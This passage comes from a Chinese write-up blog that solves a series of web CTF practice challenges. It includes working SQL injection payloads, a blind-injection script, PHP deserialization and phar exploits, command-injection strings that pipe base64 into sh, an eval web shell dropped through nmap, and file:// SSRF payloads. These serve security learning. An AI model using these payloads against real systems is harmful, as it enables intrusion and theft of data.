        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```
注册之后可以看到注入点get
![](https://img-blog.csdnimg.cn/20200315152608267.png)
### 预期
在注册处首先抓包，然后用sqlmap跑
![](https://img-blog.csdnimg.cn/20200315162555916.png)
发现表中存储的是反序列化，接下来在get处注入，有waf所以用++
```sql
?no=-1++union++select++1,group_concat(schema_name),3,4++from++information_schema.schemata--+
```
![](https://img-blog.csdnimg.cn/20200315163134233.png)
```sql
?no=-1++union++select++1,group_concat(table_name),3,4++from++information_schema.tables++where++table_schema='fakebook'-- +
```
![](https://img-blog.csdnimg.cn/2020031516340020.png)
```sql
?no=-1++union++select++1,group_concat(column_name),3,4++from++information_schema.columns++where++table_name='users'--+
```
![](https://img-blog.csdnimg.cn/20200315163607363.png)
最后将博客地址改成file:///var/www/html/flag.php来进行序列化。
```sql
?no=0++union++select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```
![](https://img-blog.csdnimg.cn/20200315164315712.png)
查看源码得到了一串base64的链接
![](https://img-blog.csdnimg.cn/20200315164457233.png)
打开即可得到flag
![](https://img-blog.csdnimg.cn/20200315164607923.png)
### 非预期
由于题目没过滤load_file，可直接盲注，师傅脚本如下
```python
import requests

url = 'http://c824219f-cb72-4deb-afd8-c12c4f7cacf1.node3.buuoj.cn/view.php?no='
result = ''

for x in range(0, 100):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((load_file('/var/www/html/flag.php')),%d,1))>%d,1,0)" % (x, mid)
        response = requests.get(url + payload)
        if 'http://c824219f-cb72-4deb-afd8-c12c4f7cacf1.node3.buuoj.cn/join.php' in response.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)

```
跑完花了10几分钟得到了flag
![](https://img-blog.csdnimg.cn/20200315155217612.png)
发现其实可以直接得flag的，传参：
`?no=0+unIon/**/select+1,load_file('/var/www/html/flag.php'),1,1`
查看源码得到了flag
![](https://img-blog.csdnimg.cn/20200315160137513.png)

参考：
[网鼎杯-Fakebook-反序列化和SSRF和file协议读取文件](https://www.cnblogs.com/wangtanzhi/p/11900128.html)
[刷题记录：[网鼎杯]Fakebook](https://www.cnblogs.com/20175211lyz/p/11469695.html)


## [极客大挑战 2019]PHP
![](https://img-blog.csdnimg.cn/20200315192948472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
由于有备份文件，尝试www.zip发现可以下载！！！
![](https://img-blog.csdnimg.cn/20200315193102871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到flag.php文件，但发现`Syc{dog_dog_dog_dog}`并不是。。。。然后查看class.php得到

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```
为php反序列化，有两个条件`$this->password == 100`和`$this->username === 'admin'`，为了得到序列化的结果，加入代码如下：
```php
$a = new Name('admin',100);
$b=serialize($a);
echo $b;
```
得到：
![](https://img-blog.csdnimg.cn/20200315195240213.png)
**由于是private，private在序列化中类名和字段名前都要加上ASCII 码为 0 的字符(不可见字符)，所以我们要加%00或\0，满足个数为14**，即
`O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
**当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。**
所以改为：`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
由于在index.php看到：
![](https://img-blog.csdnimg.cn/20200315195852167.png)
那么传值即可得到flag
![](https://img-blog.csdnimg.cn/20200315200000358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [极客大挑战 2019]Knife
真就是白给的shell，白给的题目
![](https://img-blog.csdnimg.cn/20200315221437764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用蚁剑链接，密码为Syc，即可在根目录下得到flag
![](https://img-blog.csdnimg.cn/20200315221750248.png)
## [极客大挑战 2019]LoveSQL
万能密码登录`admin' or 1=1#`
![](https://img-blog.csdnimg.cn/20200315222130103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到了pass：`9aa3f54e86651aa2d60aca2ffe2ff03b`
![](https://img-blog.csdnimg.cn/20200315222256353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现没啥用，看url发现可以试试sql注入，并没有过滤。。。。。
`?username=2&password=12' union select 1,2,3%23`发现有三列
![](https://img-blog.csdnimg.cn/20200315224001937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?username=2&password=12' union select 1,2,database()%23`  得到数据库geek
![](https://img-blog.csdnimg.cn/20200315224826708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?username=2&password=12' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23`  得到geekuser,l0ve1ysq1
![](https://img-blog.csdnimg.cn/20200315224917120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?username=2&password=12' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1')%23` 得到id,username,password
![](https://img-blog.csdnimg.cn/20200315224730203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?username=2&password=12' union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from l0ve1ysq1)%23`
![](https://img-blog.csdnimg.cn/20200315225140790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看源码即可得到flag
## [RoarCTF 2019]Easy Java
账号admin，密码admin888可登录
![](https://img-blog.csdnimg.cn/20200315225725962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
并没有什么卵用，查看help，发现很像文件包含,~~看完wp回来了~~
![](https://img-blog.csdnimg.cn/20200315225759866.png)
有一个任意文件下载漏洞，将请求方式换为POST即可
![](https://img-blog.csdnimg.cn/20200315230250828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```javascript
WEB-INF主要包含一以下文件或目录:
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码
```
首先下载并读取初始化配置信息/WEB-INF/web.xml
![](https://img-blog.csdnimg.cn/20200315231045549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
这个就是flag的路径，接下来用class读取出flag
`filename=WEB-INF/classes/com/wm/ctf/FlagController.class`
![](https://img-blog.csdnimg.cn/20200315231613267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
有一个base64编码的内容，解码可得到flag
![](https://img-blog.csdnimg.cn/20200315231722695.png)

参考文章：[[RoarCTF 2019]Easy Java](https://www.cnblogs.com/Cl0ud/p/12177085.html)
## [极客大挑战 2019]Http
拿到题目第一件事情查看源码
![](https://img-blog.csdnimg.cn/20200316125548641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问得到提示：`It doesn't come from 'https://www.Sycsecret.com'`，使用Referer头
![](https://img-blog.csdnimg.cn/20200316130105403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到提示：`Please use "Syclover" browser`，修改UA头
![](https://img-blog.csdnimg.cn/20200316130323946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到提示：`No!!! you can only read this locally!!!`，使用XFF头
![](https://img-blog.csdnimg.cn/2020031613071740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到了flag
## [0CTF 2016]piapiapia
~~看完wp~~，我这里首先下载了一个爆破目录的软件：[渗透实战之目录爆破工具dirsearch](https://github.com/maurosoria/dirsearch)
使用发现有`www.zip`文件，进行代码审计，接着下载了Seay源代码审计系统，下载链接：[Seay源代码审计系统](https://github.com/f1tz/cnseay)
![](https://img-blog.csdnimg.cn/20200316134452576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到几个可能存在的漏洞，接着查看文件发现在config.php看到了flag
```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```
在profile.php中有一个文件读取，而且是反序列化的内容
```php
else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
```
`base64_encode(file_get_contents($profile['photo']));`如果可以让photo变为config.php就可以得到flag了。
**PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的，而且只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃**
```php
$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
```
在class.php可看到我们只有传入的字符串中有`where`关键字，被替换为`hacker`关键字，才会让长度加一，否则长度不变
数组绕过：
```php
md5(Array()) = null
sha1(Array()) = null    
ereg(pattern,Array()) = null
preg_match(pattern,Array()) = false
strcmp(Array(), "abc") = null
strpos(Array(),"abc") = null
strlen(Array()) = null
```
首先在register.php注册一个账号，然后登陆到update.php
![](https://img-blog.csdnimg.cn/20200316193059405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
因为`";}s:5:“photo”;s:10:“config.php”;}`是34个字符。那么我们就传递34个where,即可绕过
![](https://img-blog.csdnimg.cn/20200316200228929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
有warning，但无关紧要，访问地址并查看源码得到一串base64加密的字符串，解密即可得到flag
![](https://img-blog.csdnimg.cn/20200316200800149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：[[0CTF 2016]piapiapia之愚见](https://www.jianshu.com/p/3b44e72444c1)

## [ZJCTF 2019]NiZhuanSiWei
给出了源码如下：
```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```
第一个绕过：
```php
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
```
使用data伪协议，data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取
`text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`，那串base64解码即为welcome to the zjctf
第二个绕过：
```php
$file = $_GET["file"];
if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
```
有file参数，但无法直接读取flag，使用filter来读useless.php的源码
`file=php://filter/read=convert.base64-encode/resource=useless.php`
![](https://img-blog.csdnimg.cn/20200316202442853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
第三个绕过：
```php
$password = $_GET["password"];
include($file);  //useless.php
$password = unserialize($password);
echo $password;
```
为反序列化，构造需要的参数即可，在本地序列化
```php
<?php  
class Flag{
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
} 
$password=new Flag();
$password = serialize($password);
echo $password; 
?>
```
![](https://img-blog.csdnimg.cn/20200316203104171.png)
运行得到序列化的结果：`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`，用password传参即可
![](https://img-blog.csdnimg.cn/20200316203324816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
查看源码得到flag
![](https://img-blog.csdnimg.cn/20200316203401243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [GXYCTF2019]Ping Ping Ping
打开很明显为命令执行，先执行ls
![](https://img-blog.csdnimg.cn/20200316204454816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
fuzz发现过滤了：空格 / + * ? { } ( ) [ ]等符号以及flag字符串，但=和\$没有过滤,用`$IFS$9`过滤空格，`a=fl;b=ag;$a$b`过滤flag，无用！！
查看index.php
![](https://img-blog.csdnimg.cn/20200316210436816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
**RCE读取PHP文件时，一定要从源代码看，因为PHP不能被解析!**
```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```
最后试不出来，看wp，发现方法很多
```javascript
1：a=ag.php;b=fl;cat$IFS$9$b$a
2：cat$IFS$9`ls`
3：echo$IFS$9Y2F0IGZsYWcucGhw=$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|sh
4：tar$IFS$9-cvf$IFS$9index$IFS$9. 打包目录下的所有文件为index，下载即可
```
最后要查看源代码得flag的
![](https://img-blog.csdnimg.cn/20200316212320855.png)


## [BUUCTF 2018]Online Tool
打开获得源码：~~随后就去看了wp~~
```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
发现不会的函数，查看php手册
![](https://img-blog.csdnimg.cn/20200316214608506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
**即使参数用了 escapeshellarg 函数过滤单引号，但参数在拼接命令的时候用了双引号的话还是会导致命令执行的漏洞**
![](https://img-blog.csdnimg.cn/20200316215448326.png)
![](https://img-blog.csdnimg.cn/20200316214704290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
**对于单个单引号, escapeshellarg 函数转义后,还会在左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义**
![](https://img-blog.csdnimg.cn/20200316215958204.png)
题目先用escapeshellarg，后用escapeshellcmd，会造成漏洞如下：
1. 传入参数：
`127.0.0.1' -v -d a=1`
2. 由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：
`'127.0.0.1'\'' -v -d a=1'`
3. 经过escapeshellcmd针对第二步处理之后的参数中的\以及a=1'中的单引号进行处理转义之后的效果如下所示：
`'127.0.0.1'\\'' -v -d a=1\'`
由于中间的\\\被解释为\而不再是转义字符
4. 所以这个payload可以简化为`curl 127.0.0.1\ -v -d a=1'`，即向127.0.0.1\发起请求，POST 数据为a=1'。

由于nmap有一个参数-oG可以实现将命令和结果写到文件
### 方法一：写一句话
`?host='<?php @eval($_POST["pass"]); ?> -oG 1.php '`
![](https://img-blog.csdnimg.cn/20200316222151997.png)
使用蚁剑，地址为：`http://6945240f-3948-46b6-8a76-aa23b97ab20f.node3.buuoj.cn/620da91054ae45f37c80a6fd6b2d47df/1.php`
即可得到flag
![](https://img-blog.csdnimg.cn/20200316223311415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
### 方法二：直接cat /flag
因为单引号被过滤了，我们使用反引号cat /flag
```php
?host=' <?php echo `cat /flag`;?> -oG 1.php '
```
![](https://img-blog.csdnimg.cn/20200316223729732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问即可得到flag
![](https://img-blog.csdnimg.cn/20200316223845193.png)
注意最后一个'前有空格
参考：
[谈谈escapeshellarg参数绕过和注入的问题](http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)
[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)
[[BUUCTF 2018]Online Tool](https://www.cnblogs.com/Cl0ud/p/12192230.html)

## [极客大挑战 2019]BabySQL
关键函数被过滤了，可以双写绕过
![](https://img-blog.csdnimg.cn/20200316224520246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
之后联合查询即可
## [极客大挑战 2019]BuyFlag
在pay.php查看源码得到一串代码
```php
~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```
抓包看一下，修改代码可得
![](https://img-blog.csdnimg.cn/202003162314568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后我们要money为100000000，但输入超过的值会返回太长，猜测判断是通过strcmp函数，可以构造数组
![](https://img-blog.csdnimg.cn/2020031623173193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
或者可以科学计数法来使价钱成立
![](https://img-blog.csdnimg.cn/2020031623201849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [SUCTF 2019]Pythonginx
**CVE-2019-9636：urlsplit不处理NFKC标准化**
PTT：[BlackHat2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
题目给出了源码：
```php
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
   
    <!-- Dont worry about the suctf.cc. Go on! -->
    <!-- Do you know the nginx? -->
```
前两个判断 host 是否是 suctf.cc ，如果不是才能继续。然后第三个经过了 decode('utf-8') 之后传进了 urlunsplit 函数，在第三个判断中又必须要等于 suctf.cc 才行
Nginx的配置文件目录为：`/usr/local/nginx/conf/nginx.conf`

在网上找到了一个师傅的脚本，用来寻找可用字符：
```python
# coding:utf-8 
for i in range(128,65537):    
    tmp=chr(i)    
    try:        
        res = tmp.encode('idna').decode('utf-8')        
        if("-") in res:            
            continue        
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))    
    except:        
        pass
```
![](https://img-blog.csdnimg.cn/20200517113250853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
构造payload：`file://suctf.c℆sr/local/nginx/conf/nginx.conf`
或者`file://suctf.cℂ/usr/local/nginx/conf/nginx.conf`
![](https://img-blog.csdnimg.cn/20200517112836516.png)
读取flag：`file://suctf.c℆sr/fffffflag`即可

还看到有另一种解法，师傅的脚本：
```python
from urllib.parse import urlsplit,urlunsplit, unquote
from urllib import parse
url = "file:////suctf.cc/usr/local/nginx/conf/nginx.conf"
parts = parse.urlsplit(url)
print(parts)

url2 = urlunsplit(parts)
parts2 = parse.urlsplit(url2)

print(parts2)
```
payload：`file:////suctf.cc/usr/local/nginx/conf/nginx.conf`
可参考：
[王叹之：[SUCTF 2019]Pythonginx](https://www.cnblogs.com/wangtanzhi/p/12181032.html)
[昂首下楼梯：[SUCTF 2019]Pythonginx](https://blog.csdn.net/qq_42812036/article/details/104291695)
## [CISCN2019 华北赛区 Day1 Web1]Dropbox
首先注册登录，发现有一个上传文件，上传php,发现为白名单
![](https://img-blog.csdnimg.cn/20200317102452164.png)
抓包尝试，发现修改文件类型就会将后缀名也一起改了，例如上传1.php.php，修改Content-Type得
![上传1.php.php](https://img-blog.csdnimg.cn/202003171031261.png)
~~去看了wp~~。由于可以下载文件，那么我们抓包可实现任意文件下载
![](https://img-blog.csdnimg.cn/20200317105341166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到了几个常见文件的源码，在class.php得到关键信息：
```php
<?php
#代码精简一下
class File {
    public $filename;

    public function close() {
        return file_get_contents($this->filename);
    }
}
class User {
    public $db;
    public function __destruct() {
        $this->db->close();
    }
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
    public function __destruct() {
        #省略了一些影响阅读的table创建代码
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '</tr>';
        }
        echo $table;
    }
}
?>
```
File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。

User类中存在close方法，并且该方法在对象销毁时执行。

同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。

运行如下PHP文件，生成一个phar文件，更改后缀名为png进行上传。
```php
<?php

class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```
运行时报错，**要将php.ini中的phar.readonly选项设置为Off，并将前面的；去掉，否则无法生成phar文件**
![](https://img-blog.csdnimg.cn/20200317124539592.png)
